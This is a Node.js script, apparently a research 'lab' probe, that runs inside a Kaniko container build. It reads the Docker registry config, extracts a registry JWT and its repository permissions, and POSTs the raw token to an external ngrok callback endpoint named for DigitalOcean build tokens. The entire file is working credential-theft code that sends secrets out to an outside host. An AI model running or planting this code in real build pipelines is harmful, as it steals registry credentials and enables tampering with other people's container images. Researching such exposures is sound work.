import crypto from 'node:crypto';
import fs from 'node:fs';

const configPath = '/kaniko/.docker/config.json';
const callbackUrl = process.env.LAB_REGISTRY_CALLBACK_URL || '';
const callbackSecret = process.env.LAB_REGISTRY_CALLBACK_SECRET || '';
const sha256 = (value) => crypto.createHash('sha256').update(value).digest('hex');

if (!callbackUrl || !callbackSecret) throw new Error('callback configuration is required');
const parsedCallback = new URL(callbackUrl);
if (parsedCallback.protocol !== 'https:'
    || !parsedCallback.hostname.endsWith('.ngrok-free.app')
    || parsedCallback.pathname !== '/digitalocean-build-token') {
  throw new Error('callback must be the allowlisted ngrok HTTPS endpoint');
}

const stat = fs.statSync(configPath);
if (!stat.isFile() || stat.size <= 0 || stat.size > 1024 * 1024) {
  throw new Error('unexpected registry config');
}
const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
const candidates = [];
for (const [registry, entry] of Object.entries(config.auths || {})) {
  let token = '';
  if (typeof entry.identitytoken === 'string') token = entry.identitytoken;
  else if (typeof entry.registrytoken === 'string') token = entry.registrytoken;
  else if (typeof entry.auth === 'string') {
    const decoded = Buffer.from(entry.auth, 'base64').toString('utf8');
    const separator = decoded.indexOf(':');
    token = separator >= 0 ? decoded.slice(separator + 1) : decoded;
  } else if (typeof entry.password === 'string') token = entry.password;
  if (/^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\./.test(token)) {
    candidates.push({registry: registry.replace(/^https?:\/\//, '').replace(/\/$/, ''), token});
  }
}
if (candidates.length !== 1) throw new Error(`expected one JWT, found ${candidates.length}`);

const {registry, token} = candidates[0];
const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8'));
const resources = (Array.isArray(claims.access) ? claims.access : [])
  .filter((item) => item?.type === 'repository' && typeof item?.name === 'string')
  .map((item) => ({
    type: 'repository',
    name: item.name,
    actions: Array.isArray(item.actions) ? item.actions.map(String).sort() : [],
  }));
const response = await fetch(parsedCallback, {
  method: 'POST',
  redirect: 'manual',
  headers: {'content-type': 'application/json', 'x-lab-secret': callbackSecret},
  body: JSON.stringify({
    schema: 1,
    capturedAt: new Date().toISOString(),
    probe: 'account2-static-build',
    registry,
    token,
    resources,
  }),
});
if (response.status !== 204) throw new Error(`callback HTTP ${response.status}`);
console.log(JSON.stringify({
  event: 'registry-credential-captured',
  tokenSha256: sha256(token),
  resourceCount: resources.length,
  callbackStatus: response.status,
  rawCredentialPrinted: false,
}));
